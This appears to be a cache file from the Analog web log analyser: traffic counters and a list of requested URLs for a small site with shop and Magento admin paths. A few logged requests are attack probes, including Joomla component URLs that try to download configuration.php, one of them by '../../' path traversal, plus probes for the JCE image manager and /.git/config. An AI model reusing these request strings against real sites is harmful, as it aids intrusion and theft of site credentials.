CACHE type 5 produced by analog 6.0/Unix. Do not modify or delete!
T	0	0	1272	1151	4	1388	9677685
D	24869758	26090399
17270	191	1	0	0
17275	47	1	1	7751
17275	60	1	1	7751
17275	61	1	1	7751
17275	79	1	1	7751
17275	98	1	1	7751
17275	243	1	1	7751
17275	246	1	1	7751
17275	251	1	1	7751
17285	215	1	0	0
17290	137	2	0	0
17298	240	2	0	14628
17301	46	1	1	7751
17301	52	1	1	7751
17301	53	1	1	7751
17301	72	1	1	7751
17301	213	1	1	7751
17301	224	1	1	7751
17301	243	1	1	7751
17313	205	1	1	7751
17313	216	1	1	7751
17313	224	1	1	7751
17313	234	1	1	7751
17314	170	1	1	7751
17314	179	1	1	7751
17314	182	1	1	7751
17329	121	1	1	7751
17329	124	1	1	7751
17329	127	1	1	7751
17354	232	1	0	0
17357	66	1	1	7751
17357	68	1	1	7751
17357	81	1	1	7751
17382	141	2	2	0
17382	190	2	2	0
17383	139	2	2	0
17391	23	1	1	7751
17391	31	2	2	15502
17419	161	1	1	7751
17419	162	1	1	7751
17419	165	1	1	7751
17432	109	1	1	0
17437	198	1	1	0
17437	267	1	1	0
17437	269	1	1	0
17438	156	1	1	0
17439	114	1	1	0
17443	226	1	1	0
17443	247	1	1	0
17443	266	1	1	0
17444	44	1	1	0
17444	198	1	1	0
17444	253	1	1	0
17444	280	1	1	0
17444	286	1	1	0
17445	202	1	1	0
17446	72	1	1	0
17451	157	1	1	7751
17451	158	1	1	7751
17451	171	1	1	7751
17452	250	1	1	0
17453	178	1	1	0
17455	241	1	1	7751
17457	118	1	1	7751
17462	20	1	1	7751
17472	68	1	1	7751
17473	150	1	1	0
17473	210	1	1	0
17473	241	1	1	0
17480	285	1	1	0
17485	99	1	1	7751
17485	122	1	1	7751
17485	127	1	1	7751
17485	133	1	1	7751
17486	186	1	0	0
17488	203	1	1	0
17489	100	1	1	7751
17492	78	1	1	7751
17495	157	1	1	0
17495	180	1	1	0
17496	166	1	1	7751
17498	1	1	1	7751
17500	91	1	1	7751
17501	26	1	1	0
17501	246	1	1	0
17502	191	1	1	0
17503	125	1	1	7751
17506	179	1	1	7751
17509	203	1	1	0
17510	160	1	1	7751
17510	161	1	1	7751
17510	163	1	1	7751
17510	276	1	1	7751
17510	279	1	1	7751
17510	287	1	1	7751
17513	150	1	1	7751
17517	167	1	1	7751
17520	194	1	1	7751
17523	13	1	1	0
17523	24	1	1	0
17524	49	1	1	7751
17527	73	1	1	7751
17527	161	1	0	0
17529	30	1	1	0
17529	156	1	1	0
17530	99	1	1	7751
17530	240	1	1	0
17533	120	1	1	7751
17536	141	1	1	7751
17539	211	1	1	7751
17541	134	2	2	15502
17541	141	1	1	7751
17542	250	1	1	7751
17545	285	1	1	7751
17552	127	1	1	7751
17556	36	1	1	7751
17559	60	1	1	7751
17562	86	1	1	7751
17565	111	2	2	15502
17568	134	1	1	7751
17569	48	1	1	7751
17569	49	1	1	7751
17569	51	1	1	7751
17571	154	1	1	7751
17575	98	1	1	7751
17575	152	1	0	0
17578	220	1	1	0
17578	224	1	1	0
17579	185	1	1	0
17579	248	1	1	7751
17584	108	1	1	7751
17588	247	1	1	7751
17591	206	1	1	0
17592	160	1	1	0
17593	58	1	1	0
17595	233	1	1	7751
17598	188	1	0	0
17600	14	1	1	0
17600	57	1	1	0
17600	72	1	1	7751
17600	148	1	1	7751
17600	151	1	1	7751
17600	152	1	1	7751
17600	191	1	1	0
17603	181	1	1	0
17604	68	1	1	0
17604	201	1	1	7751
17606	19	1	1	0
17609	34	1	1	7751
17613	48	1	1	0
17613	144	1	1	7751
17617	245	1	1	7751
17620	71	1	1	0
17622	63	1	1	7751
17626	169	1	1	7751
17627	168	1	1	0
17627	191	1	1	0
17630	149	1	1	7751
17630	153	2	2	15502
17631	70	2	2	15502
17631	78	1	1	7751
17632	141	1	1	7751
17633	269	1	1	0
17633	280	1	1	7751
17634	39	1	1	7751
17634	52	1	1	7751
17634	113	1	1	7751
17634	215	1	1	7751
17635	130	1	1	7751
17638	122	1	1	7751
17642	284	1	1	7751
17648	15	1	1	7751
17648	17	1	1	0
17648	201	1	1	0
17654	218	1	1	7751
17659	21	1	1	7751
17659	132	1	0	0
17659	133	2	0	0
17659	177	1	1	7751
17662	40	1	1	7751
17662	41	1	1	7751
17662	43	1	1	7751
17662	157	1	1	0
17663	249	1	1	7751
17667	135	1	1	7751
17669	37	1	1	0
17669	154	1	1	0
17669	220	1	1	0
17670	212	1	1	0
17670	277	1	1	0
17671	45	1	1	0
17671	218	1	1	7751
17672	92	1	1	7751
17675	73	1	1	7751
17676	96	1	1	0
17676	170	1	1	0
17678	55	1	1	7751
17681	28	1	1	7751
17683	59	1	1	0
17684	13	1	1	7751
17686	278	1	1	7751
17689	256	1	1	7751
17690	34	1	1	7751
17690	39	1	1	7751
17690	45	1	1	7751
17691	61	1	1	7751
17691	195	1	1	7751
17692	94	1	1	7751
17692	230	1	1	7751
17698	40	1	1	0
17698	61	1	1	7751
17700	126	1	1	7751
17703	184	1	1	0
17704	67	1	1	0
17704	72	1	1	0
17704	124	1	1	7751
17705	219	1	1	7751
17705	241	1	1	0
17706	28	1	1	0
17706	41	1	1	0
17706	212	1	1	7751
17707	94	1	1	7751
17708	284	1	1	7751
17710	63	1	1	7751
17713	33	1	1	7751
17715	286	1	1	7751
17717	65	1	1	0
17717	243	1	1	0
17718	252	1	1	7751
17719	94	1	1	0
17721	214	1	1	7751
17722	63	1	1	7751
17722	66	2	2	15502
17724	177	1	1	7751
17725	175	2	2	0
17726	96	1	1	0
17727	138	1	1	7751
17729	21	1	1	7751
17731	184	1	1	0
17732	11	1	1	7751
17732	226	1	1	0
17733	24	1	1	0
17733	148	1	1	7751
17735	11	1	1	7751
17738	11	1	1	7751
17739	33	1	1	0
17739	256	1	1	0
17739	270	1	1	0
17741	11	1	1	7751
17744	13	1	1	7751
17746	2	1	1	0
17746	82	1	1	0
17747	9	1	1	0
17747	13	1	1	7751
17748	252	1	0	0
17749	182	5	0	0
17750	223	1	1	7751
17752	128	1	1	0
17752	155	1	1	0
17752	254	1	1	0
17753	237	1	1	7711
17755	133	1	1	7711
17755	141	1	1	7711
17755	148	1	1	7711
17756	260	1	1	7711
17759	74	1	1	0
17759	270	1	1	7711
17760	136	1	1	0
17761	5	1	1	0
17762	194	1	1	7711
17765	211	1	1	7711
17767	46	1	1	0
17767	164	1	1	0
17767	221	1	1	0
17768	229	1	1	7711
17771	246	1	1	7711
17773	133	1	1	0
17774	252	1	1	0
17774	265	1	1	7711
17775	80	1	1	0
17778	1	1	1	7711
17780	52	1	1	0
17780	283	1	1	0
17781	26	1	1	7711
17783	235	1	1	7711
17784	45	1	1	7711
17784	58	1	1	7711
17784	60	1	1	7711
17786	202	1	1	7711
17787	71	1	1	0
17788	79	1	1	0
17788	269	1	1	0
17789	168	1	1	7711
17795	95	1	1	7711
17798	63	1	1	7711
17801	28	1	1	7711
17803	278	1	1	7711
17813	286	1	1	7711
17814	4	1	1	7711
17814	9	1	1	7711
17829	128	1	1	7711
17832	105	1	1	7711
17834	25	1	1	7711
17834	223	1	1	7711
17835	85	1	1	7711
17838	55	1	1	7711
17841	27	1	1	7711
17843	213	2	2	7711
17843	214	1	1	7711
17843	223	1	1	0
17843	232	1	1	7711
17843	287	1	1	7711
17845	61	1	1	0
17847	42	1	1	7711
17850	57	1	1	0
17850	98	1	1	7711
17850	101	1	1	7711
17850	275	1	1	7711
17851	43	1	0	6903
17851	52	1	1	8034
17851	61	1	1	7711
17851	71	1	1	6782
17851	80	1	1	7711
17851	113	1	1	0
17851	128	1	0	6903
17851	138	1	1	8034
17851	151	1	1	7221
17851	154	1	1	7711
17851	160	1	1	6782
17851	174	1	1	7711
17852	27	1	1	7711
17852	39	1	1	6782
17852	41	1	1	7711
17852	46	1	1	7221
17852	55	1	1	8034
17852	60	1	0	6903
17852	131	1	1	7711
17852	139	1	1	6782
17852	143	1	1	7711
17852	174	1	1	8034
17852	184	1	0	6903
17852	189	1	1	7221
17852	275	1	1	7221
17852	277	1	0	6903
17852	284	1	1	8034
17853	8	1	1	7711
17853	10	1	1	6782
17853	26	1	1	7711
17853	80	1	1	8034
17853	87	1	0	6903
17853	92	1	1	7711
17853	115	1	1	7711
17853	127	1	1	6782
17853	135	1	1	7221
17853	155	1	1	7711
17853	172	1	1	8034
17853	177	1	0	6903
17853	187	1	1	7711
17853	226	1	1	7711
17853	235	1	1	6782
17853	266	1	1	7221
17854	32	1	0	6903
17854	34	1	1	8034
17854	66	1	1	7711
17854	101	1	1	7221
17854	108	1	1	6782
17854	117	1	1	7711
17854	123	1	1	8034
17854	125	1	0	6903
17854	150	1	1	7711
17854	186	1	1	7221
17854	192	1	1	6782
17854	203	1	1	7711
17854	210	1	0	6903
17854	213	1	1	8034
17854	240	1	1	7711
17854	277	1	1	7221
17854	283	1	1	6782
17855	5	1	1	7711
17855	32	1	0	6903
17855	35	1	1	8034
17855	97	1	1	7711
17855	136	1	1	7221
17855	139	1	1	6782
17855	177	1	1	7711
17855	197	1	1	8034
17855	211	1	1	7711
17855	221	1	1	7221
17855	229	1	1	6782
17855	242	1	0	6903
17855	266	1	1	7711
17855	284	1	1	8034
17856	9	1	1	7711
17856	23	1	1	7221
17856	28	1	1	6782
17856	40	1	0	6903
17856	85	1	1	8034
17856	96	1	1	7711
17856	108	1	1	7221
17856	137	1	0	6903
17856	140	1	1	6782
17856	149	1	1	7711
17856	176	1	1	8034
17856	183	1	1	7711
17856	193	1	1	7221
17856	203	1	1	7711
17856	227	1	1	6782
17856	229	1	0	6903
17856	235	1	1	7711
17856	266	1	1	8034
17856	273	1	1	7711
17857	9	1	1	7221
17857	54	1	0	6903
17857	67	1	1	6782
17857	73	1	1	7711
17857	123	1	1	8034
17857	135	1	1	7711
17857	177	1	1	7221
17857	185	1	1	0
17857	212	1	1	8034
17857	224	1	1	7711
17857	232	1	1	7711
17857	238	1	1	6782
17857	239	1	0	6903
17857	273	1	1	7221
17858	12	1	1	8034
17858	25	1	1	7711
17858	28	1	1	7711
17858	35	1	0	6903
17858	38	1	1	6782
17858	69	1	1	7221
17858	108	1	1	8034
17858	121	1	1	7711
17858	123	1	1	7711
17858	129	1	1	6782
17858	131	1	0	6903
17858	180	1	1	7221
17858	219	1	1	8034
17858	239	1	0	6903
17858	241	1	1	6782
17858	265	1	1	7711
17858	267	1	1	7711
17859	67	1	1	0
17859	248	1	1	7711
17862	285	1	1	7711
17864	81	1	1	0
17865	231	1	1	0
17866	36	1	1	7711
17869	76	1	1	7711
17870	150	1	1	7711
17870	151	1	1	7711
17871	197	1	1	0
17872	54	1	1	0
17872	116	1	1	7711
17872	145	1	1	0
17872	153	1	1	7221
17873	185	1	1	8034
17873	215	1	1	7711
17873	250	1	1	7711
17873	270	1	1	7711
17874	2	1	1	6782
17874	18	1	0	6903
17875	150	1	1	7711
17876	100	1	1	7711
17876	105	1	1	7711
17876	111	1	1	7711
17877	107	1	1	7711
17877	273	1	1	7711
17878	284	1	1	0
17879	28	1	1	0
17879	159	2	2	14932
17879	201	1	1	0
17880	50	1	1	8034
17882	242	1	1	7711
17885	61	1	1	7711
17885	168	1	1	0
17886	34	1	1	7711
17886	90	1	1	0
17886	94	1	1	7711
17886	103	1	1	0
17887	90	1	1	7711
17888	100	2	2	15422
17889	75	1	1	7711
17889	94	1	1	7711
17889	112	1	1	7711
17890	100	1	1	7711
17891	91	1	1	7711
17892	116	1	1	7711
17892	184	1	1	7711
17892	218	1	1	7711
17893	143	1	1	7711
17893	151	1	1	0
17893	259	1	1	0
17894	8	1	1	0
17894	127	1	1	7711
17895	14	1	1	7711
17895	100	1	1	7711
17895	259	1	1	7711
17896	119	1	1	7711
17897	108	1	1	7711
17898	112	1	1	7711
17899	45	1	1	7711
17899	90	1	1	7711
17899	197	1	1	7711
17900	105	1	1	0
17900	106	1	1	7711
17900	246	1	1	0
17901	73	1	1	0
17901	123	1	1	7711
17901	184	1	1	7711
17902	95	1	1	7711
17902	116	1	1	7711
17903	126	1	1	7711
17903	157	2	2	15422
17903	166	1	1	7711
17904	98	1	1	7711
17904	216	1	1	7711
17905	99	1	1	7711
17905	186	1	1	7711
17905	250	1	1	7711
17906	104	1	1	0
17906	109	1	1	7711
17907	111	1	1	7711
17907	120	1	1	0
17908	38	1	1	0
17908	105	1	1	7711
17908	260	1	1	7711
17909	92	1	1	7711
17910	98	2	2	15422
17910	231	1	1	7711
17911	88	1	1	7711
17912	120	1	1	7711
17913	89	1	1	0
17913	123	1	1	0
17913	132	1	1	7711
17914	27	1	1	0
17914	36	1	1	7711
17914	122	1	1	7711
17914	127	1	1	7711
17915	85	1	1	7711
17916	285	1	1	7711
17917	126	1	1	7711
17918	263	1	1	7711
17919	253	1	1	7711
17920	78	1	1	7711
17920	196	1	1	0
17920	212	1	1	7711
17920	215	1	1	7711
17921	43	1	1	7711
17921	61	1	1	0
17921	154	1	1	7711
17922	75	1	1	0
17922	112	1	0	0
17922	121	1	1	7711
17923	116	1	1	7711
17923	181	1	1	7711
17924	13	1	1	7711
17924	92	1	1	7711
17925	94	1	1	7711
17926	101	1	1	7711
17927	101	1	1	7711
17927	110	1	1	7711
17927	137	1	1	0
17927	244	1	1	0
17928	9	1	1	7711
17928	51	1	1	0
17928	112	1	1	7711
17928	258	1	1	7711
17929	111	1	1	7711
17929	167	1	1	7711
17929	174	1	1	7711
17930	107	1	1	7711
17930	187	1	1	7711
17930	246	1	1	7711
17931	99	1	1	7711
17932	146	1	1	7711
17932	246	1	1	7711
17932	251	1	1	7711
17932	255	1	1	7711
17933	115	1	1	7711
17933	273	1	1	7711
17934	177	1	1	0
17934	179	1	1	7711
17935	77	1	1	7711
17935	78	1	1	7711
17935	96	1	1	0
17935	166	1	1	0
17935	255	1	1	7711
17936	100	1	1	7711
17936	174	1	1	7711
17937	80	1	1	7711
17937	101	1	1	7711
17938	33	1	1	7711
17938	113	1	1	7711
17939	96	1	1	7711
17939	239	1	1	7711
17940	27	1	1	7711
17940	139	1	1	7711
17940	183	1	1	7711
17941	98	1	1	7711
17941	278	1	1	0
17942	98	1	1	7711
17942	140	1	1	0
17942	160	1	1	7711
17942	213	1	1	0
17943	28	1	1	7711
17943	55	1	1	7711
17943	101	1	1	7711
17943	157	1	1	7711
17944	0	1	1	7711
17944	110	1	1	7711
17945	99	1	1	7711
17945	118	1	1	7711
17946	99	1	1	7711
17947	106	1	1	7711
17947	114	1	1	7711
17948	113	1	1	7711
17948	209	1	1	0
17949	108	1	1	7711
17949	166	1	1	7711
17949	188	1	1	7711
17949	192	1	1	0
17949	209	1	1	0
17949	254	1	1	7711
17950	91	1	1	7711
17950	210	1	1	7711
17951	11	1	1	7711
17951	143	1	1	7711
17952	105	1	1	7711
17952	159	1	1	7711
17952	204	1	1	7711
17953	104	1	1	7711
17954	27	1	1	7711
17954	105	1	1	7711
17955	133	2	2	15422
17956	83	1	1	7711
17956	103	1	1	7711
17956	206	1	1	7711
17956	287	1	1	7711
17957	86	1	1	7711
17957	112	1	1	7711
17957	114	1	1	7711
17957	162	1	1	0
17958	45	1	1	0
17958	104	1	1	7711
17958	114	1	1	0
17959	49	1	1	0
17959	148	1	1	7711
17960	142	1	1	7711
17960	159	1	1	7711
17960	190	1	1	7711
17960	271	1	1	7711
17960	276	1	1	7711
17960	281	1	1	7711
17961	98	1	1	7711
17961	104	1	1	7711
17961	125	1	1	7711
17961	142	1	1	7711
17961	143	1	1	7711
17961	145	1	1	7711
17962	122	1	1	7711
17962	163	1	1	7711
17962	166	1	1	0
17962	208	1	1	7711
17963	98	1	1	0
17963	109	1	1	0
17963	111	1	1	7711
17963	258	1	1	7711
17964	116	1	1	7711
17964	117	1	1	7711
17964	210	1	1	7711
17965	27	1	1	7711
17965	114	1	1	7711
17966	121	1	1	7711
17966	122	1	1	7711
17967	30	1	1	7711
17967	116	1	1	7711
17968	81	1	1	7711
17968	112	1	1	7711
17968	176	1	1	7711
17968	187	1	1	7711
17968	244	1	1	7711
17969	114	1	1	7711
17969	203	1	1	0
17970	41	1	1	0
17970	95	1	1	7711
17970	102	1	1	7711
17970	139	1	1	7711
17970	182	1	1	0
17971	24	1	1	7711
17971	46	1	1	7711
17971	48	1	1	7711
17971	121	1	1	7711
17972	94	1	1	7711
17972	101	1	1	7711
17972	114	1	1	7711
17973	134	1	1	7711
17973	154	1	1	7711
17974	117	1	1	7711
17974	240	1	1	7711
17975	52	1	1	7711
17975	122	1	1	7711
17975	127	1	1	7711
17975	172	1	1	7711
17976	136	1	1	7711
17976	137	1	1	7711
17976	167	1	1	0
17976	224	1	1	7711
17977	107	1	1	7711
17977	162	1	1	7711
17977	183	1	1	0
17978	70	1	1	7711
17978	100	1	1	0
17978	116	1	1	7711
17978	125	1	1	7711
17978	213	1	1	7711
17979	87	1	1	7711
17979	126	1	1	7711
17979	208	1	1	7711
17980	14	1	1	7711
17980	112	1	1	7711
17981	106	1	1	7711
17981	181	1	1	7711
17982	96	1	1	7711
17982	138	1	1	7711
17982	228	1	1	7711
17983	1	1	1	7711
17983	43	1	1	0
17983	92	1	1	7711
17983	141	1	1	7711
17984	73	1	1	0
17984	126	1	1	0
17984	134	1	1	0
17985	79	1	1	7711
17985	97	1	1	7711
17985	105	1	1	7711
17985	148	1	1	0
17985	272	1	1	7711
17986	106	1	1	7711
17986	178	1	1	7711
17987	116	1	1	7711
17988	108	1	1	7711
17988	125	1	1	0
17988	243	1	1	7711
17989	31	1	1	7711
17989	100	1	1	7711
17989	108	1	1	7711
17989	161	1	1	7711
17989	256	1	1	7711
17989	281	1	1	7711
17990	147	1	1	7711
17990	182	1	0	0
17991	70	1	1	7711
17991	76	1	1	7711
17991	81	1	1	7711
17991	115	1	1	7711
17992	91	1	1	7711
17992	106	1	1	7711
17992	159	1	1	7711
17993	49	1	1	7711
17993	103	1	1	7711
17994	94	2	2	15422
17994	97	2	2	15422
17995	115	1	1	7711
17996	113	1	1	7711
17996	122	1	1	7711
17996	198	1	1	7711
17997	69	1	1	7711
17997	110	1	1	7711
17999	101	1	1	7711
17999	146	1	1	7711
18000	5	1	1	7711
18000	79	1	1	0
18000	85	1	1	7711
18000	141	1	1	7711
18001	86	1	1	7711
18002	92	2	2	15422
18002	97	2	2	15422
18002	172	1	1	7711
18003	87	1	1	7711
18003	259	1	1	7711
18004	89	1	1	7711
18004	92	1	0	26
18004	132	1	0	52
18004	140	1	1	0
18004	238	1	1	7711
18005	109	1	1	7711
18005	192	1	1	7711
18006	67	1	1	7711
18006	98	1	1	7711
18006	105	1	1	7711
18007	17	1	1	7711
18007	89	1	1	7711
18008	100	1	1	7711
18008	124	1	1	7711
18008	162	1	1	7711
18008	205	1	1	7711
18009	102	1	1	7711
18010	3	1	1	7711
18010	54	1	1	7711
18011	15	1	1	7711
18011	108	1	1	7711
18011	118	1	1	7711
18011	215	1	1	7711
18011	254	1	1	0
18011	264	1	1	0
18012	102	1	1	0
18013	99	1	1	7711
18013	142	1	1	7711
18014	17	1	1	7711
18014	113	1	1	7711
18014	177	1	1	7711
18014	217	1	1	7711
18015	90	1	1	7711
18015	141	1	1	7711
18016	103	1	1	7711
18016	215	1	1	7711
18017	90	1	1	7711
18017	119	1	1	7711
18017	275	1	1	7711
18017	279	1	1	7711
18018	71	1	1	6782
18018	107	1	1	7711
18018	140	1	1	7711
18018	149	1	1	7711
18018	152	1	1	7711
18018	265	1	1	6782
18019	73	1	1	8034
18019	99	1	1	7711
18019	112	1	1	7711
18019	125	1	1	7711
18019	191	1	1	7711
18020	85	1	1	6782
18020	210	1	1	7711
18020	223	1	1	7711
18021	28	1	0	6903
18021	99	1	1	8034
18021	109	1	1	7711
18021	118	1	0	6903
18021	151	1	1	7711
18022	112	1	1	7711
18023	33	1	1	7221
18023	99	1	1	7711
18023	123	2	2	15422
18023	185	1	1	7711
18023	195	1	1	7711
18023	205	1	1	7711
18023	207	1	1	7711
18023	256	1	1	7711
18023	269	1	1	7221
18024	49	1	1	6782
18024	50	1	1	7711
18024	104	1	1	7711
18024	106	1	1	7711
18024	117	1	1	8034
18024	137	1	1	6782
18024	189	1	1	7711
18024	248	1	1	7711
18025	17	1	1	0
18025	22	1	1	7711
18025	33	1	1	8034
18025	44	1	1	7711
18025	65	1	1	7711
18025	100	1	1	7711
18025	129	1	1	0
18025	133	1	1	0
18025	145	1	1	0
18025	180	1	1	0
18025	188	1	1	7711
18026	162	1	1	7711
18026	281	1	1	6782
18027	24	1	0	6915
18027	96	1	1	7711
18027	168	1	1	8034
18027	176	1	1	7711
18027	179	1	0	6915
18027	267	1	0	6915
18028	20	1	1	7711
18028	96	1	1	7711
18029	81	1	1	7711
18029	104	1	1	7711
18030	159	1	1	7711
18031	88	1	1	7711
18032	4	1	1	7227
18032	57	1	1	0
18032	71	1	1	7711
18032	97	1	1	7711
18032	125	1	1	7711
18032	137	1	1	7227
18033	62	1	1	7711
18033	105	1	1	7711
18033	120	1	1	7711
18033	144	1	1	7711
18033	180	1	1	7711
18033	198	1	0	0
18033	211	1	0	6915
18033	252	1	1	7711
18034	5	1	1	7711
18034	99	1	1	7711
18035	6	1	1	7711
18035	96	1	1	7711
18035	213	1	1	7711
18036	55	1	1	8034
18036	106	1	1	7711
18036	222	1	1	7711
18037	135	1	1	7711
18038	99	1	1	7711
18039	103	1	1	7711
18039	229	1	1	0
18040	81	1	1	7711
18040	102	1	1	7711
18040	194	1	1	7711
18041	15	1	1	0
18041	28	1	1	0
18041	60	1	1	7711
18041	98	1	1	7711
18041	139	1	1	0
18042	11	1	1	7711
18042	93	1	1	7711
18042	270	1	1	7711
18043	100	1	1	7711
18043	157	1	1	7711
18043	180	1	1	7227
18043	196	1	1	7711
18044	4	1	0	1070
18044	78	1	1	7711
18044	125	1	1	0
18044	141	1	0	1070
18044	180	1	1	7711
18044	225	1	1	7227
18045	135	1	1	7711
18046	86	1	1	7711
18046	98	1	1	7711
18046	107	1	1	7711
18046	151	10	2	98265
18046	215	1	1	7711
18047	106	1	1	7711
18047	137	1	1	7711
18048	108	1	1	7711
18049	68	2	2	15422
18049	88	1	1	7711
18050	49	1	1	7711
18050	97	1	1	7711
18050	174	1	1	7711
18051	29	1	1	7711
18051	95	1	1	7711
18051	203	1	1	7711
18052	99	1	1	7711
18053	81	1	1	7711
18053	90	1	1	7711
18053	156	1	1	39909
18053	207	1	1	7711
18054	74	1	1	39897
18054	86	1	1	7711
18054	88	1	1	7711
18054	89	1	1	7711
18054	93	1	1	39909
18054	95	1	1	7711
18055	15	1	1	0
18055	97	1	1	7711
18055	107	1	1	7711
18055	144	1	1	7711
18055	179	1	1	7711
18055	261	1	1	7711
18055	270	1	1	6782
18056	125	1	1	7711
18056	162	1	1	7711
18056	242	1	1	7711
18057	44	1	1	8034
18057	62	1	1	7711
18057	103	1	1	7711
18058	112	1	1	7711
18059	42	1	1	6782
18059	103	1	1	7711
18059	205	1	1	7711
18060	94	1	1	7711
18060	152	1	1	39909
18061	77	1	1	6782
18061	82	1	1	7711
18061	88	1	1	7711
18061	129	1	1	7711
18062	37	1	1	7711
18062	72	1	1	7711
18062	92	1	1	7711
18062	96	1	1	7711
18062	138	1	1	7711
18062	142	1	1	7711
18062	282	1	1	39909
18063	34	10	2	98265
18063	60	1	0	6915
18063	72	1	1	7711
18063	93	1	1	7711
18063	169	9	4	359492
18063	170	7	1	279640
18063	193	1	1	7711
18063	261	1	1	8034
18064	108	1	0	6915
18064	129	1	1	7711
18065	111	1	1	7711
18066	92	1	1	7711
18066	131	1	0	0
18066	183	1	1	7711
18066	227	1	1	39909
18067	97	2	2	15422
18067	226	1	0	6915
18068	70	1	1	7711
18068	119	1	1	7711
18068	199	1	1	7711
18069	31	1	1	7227
18069	105	1	1	7711
18069	216	1	1	7711
18070	61	1	1	7711
18070	70	1	1	7711
18070	103	1	1	7711
18071	104	1	1	7711
18072	84	1	1	8034
18072	109	1	1	7711
18072	153	1	1	7711
18073	99	1	1	7711
18073	101	1	1	7711
18073	172	1	1	7711
18074	76	1	1	7711
18074	91	1	1	7711
18074	105	1	1	7711
18074	128	1	0	0
18074	274	1	1	7711
18075	95	1	1	7711
18075	131	1	1	7711
18076	6	1	1	7711
18076	98	1	1	7711
18076	112	1	1	7711
18076	197	1	1	7711
18077	95	1	1	7711
18077	108	1	1	7711
18077	145	12	4	479484
18078	67	10	2	98265
18078	121	1	1	7711
18079	110	1	1	7711
18079	250	1	1	7711
18080	105	1	1	7711
18080	106	1	1	7227
18080	142	1	1	7711
18081	78	1	1	7711
18081	112	1	1	7227
18081	115	1	1	7711
18081	145	1	1	7711
18081	151	1	1	7711
18081	152	1	1	39897
18081	158	1	1	7711
18081	166	1	1	39909
18081	168	1	1	7711
18081	282	1	1	7711
18082	102	1	1	7711
18082	105	1	1	39909
18082	111	1	1	39897
18082	112	2	2	15422
18082	115	1	1	7711
18082	135	1	1	7711
18083	114	1	1	7711
18083	171	1	1	7711
18084	137	2	2	15422
18084	196	1	1	7711
18085	164	1	1	7711
18086	89	1	1	7711
18086	108	1	1	7711
18086	226	1	1	7711
18087	100	1	1	7711
18087	199	1	1	39909
18087	238	1	1	7711
18088	118	1	1	7711
18088	158	1	1	7711
18088	165	1	1	7711
18089	122	1	1	7711
18090	108	1	1	7711
18090	120	1	1	7711
18090	284	1	1	7711
18091	101	1	1	7711
18092	67	10	2	98265
18092	101	1	1	7711
18092	183	1	1	7711
18093	35	1	1	6782
18093	96	1	1	7711
18093	115	1	1	6782
18093	170	1	1	7711
18094	75	1	1	7711
18094	99	1	1	7711
18094	206	1	1	7711
18094	229	1	1	7711
18094	279	1	1	6782
18095	140	1	1	7711
18096	79	1	1	7711
18096	110	1	1	7711
18096	255	1	1	39897
18096	264	1	1	7711
18097	6	1	1	8034
18097	98	1	1	7711
18097	99	1	1	7711
18097	124	1	1	7711
18098	100	1	1	7711
18098	268	1	0	6915
18099	73	1	1	7711
18099	78	1	1	7711
18099	106	1	1	7711
18099	124	1	0	6915
18099	258	1	1	7711
18099	269	1	1	7711
18100	22	1	1	8034
18100	155	1	1	7711
18100	204	1	1	7711
18101	31	1	1	7711
18101	34	1	1	7711
18101	113	1	1	7711
18102	137	1	1	7711
18102	258	1	1	7711
18103	110	1	1	7711
18103	212	1	0	6915
18103	271	1	1	7711
18104	51	1	1	8034
18104	73	1	1	7227
18104	109	1	1	7711
18104	126	1	1	39897
18104	264	1	1	7711
18105	30	1	1	7711
18105	142	1	1	7711
18105	285	1	1	7711
18106	67	10	2	98265
18106	107	1	1	7711
18106	208	1	1	7711
18107	0	1	1	39909
18107	60	1	1	7711
18107	134	1	1	7711
18107	143	1	1	7711
18107	266	1	1	7711
18108	88	1	1	7711
18109	137	2	2	15422
18109	275	1	1	7711
18110	1	1	1	7711
18110	124	1	1	7711
18110	128	1	1	7711
18111	20	1	1	7711
18111	79	1	1	7711
18111	128	1	1	7711
18112	120	1	1	7711
18112	167	1	1	7711
18112	242	1	1	7711
18113	154	1	1	7711
18113	216	2	2	47620
18113	263	1	1	39897
18114	24	1	1	7711
18114	120	1	1	7711
18114	170	1	1	7711
18115	19	1	1	7711
18115	29	2	2	15422
18115	31	1	1	39897
18115	37	2	2	47620
18115	142	1	1	7711
18115	157	1	1	7711
18115	268	1	1	7711
18116	32	1	1	7711
18116	141	1	1	7711
18116	198	1	1	7711
18117	59	1	1	7711
18117	120	1	1	7711
18117	192	1	1	7711
18118	22	1	1	7711
18118	95	1	1	7711
1	1	0	0	0	25713328	0	0	25713328	0	0	6903	/contacto.php?66.249.64.72
1	5	0	0	0	26072979	0	0	25986995	0	0	91290	/js/cufon-yui.js
1	5	0	0	0	26072979	0	0	25986995	0	0	40485	/js/jquery.easing.1.3.js
1	2	0	0	5	26031608	0	26032743	26011570	0	26010312	79892	/shop/errors/503.php
1	0	0	0	4	0	0	24952013	0	0	24935745	0	/robots.txt?45.55.226.20
1	2	2	0	0	24877215	0	0	24876238	0	0	15502	/?181.72.179.101
1	31	31	0	0	26070129	0	0	25706199	0	0	223899	/contacto.html
1	1	0	0	0	25429624	0	0	25429624	0	0	0	/Microsoft-Server-ActiveSync?Cmd=OPTIONS&User=risami&DeviceId=SEC1A3AD1CC35AC8&DeviceType=SamsungDevice
1	3	3	0	5	26031607	0	26032743	26011569	0	26010312	119868	/magento/index.php/admin/
1	2	0	0	0	25808243	0	0	25180772	0	0	0	/Microsoft-Server-ActiveSync?66.249.64.72
1	0	0	0	1	0	0	25884249	0	0	25884249	0	/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php
1	0	0	0	1	0	0	25884250	0	0	25884250	0	/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form
1	0	0	0	1	0	0	25092807	0	0	25092807	0	/apple-app-site-association?66.249.64.72
1	0	0	0	1	0	0	24954358	0	0	24954358	0	/?45.55.226.20
1	1	0	0	192	25926223	0	26087132	25926223	0	24859832	26	/robots.txt
1	0	0	0	1	0	0	25539289	0	0	25539289	0	/.git/config?165.227.103.74
1	0	0	0	1	0	0	25849499	0	0	25849499	0	/owa/
1	33	33	0	0	26056755	0	0	25705795	0	0	223806	/quienes_somos.html
1	0	0	0	6	0	0	25120760	0	0	25119054	0	/ct/v1/sth-gossip
1	5	0	0	0	26072979	0	0	25986995	0	0	28490	/js/bgSlider.js
1	0	0	0	13	0	0	25049587	0	0	24957655	0	/robots.txt?138.197.4.107
1	0	0	0	42	0	0	26028697	0	0	24990921	0	/autodiscover/autodiscover.xml
1	2	2	0	5	26031607	0	26032743	26011570	0	26010312	79904	/shop/index.php/admin/
1	0	0	0	1	0	0	25884249	0	0	25884249	0	/index.php?option=com_macgallery&view=download&albumid=../../configuration.php
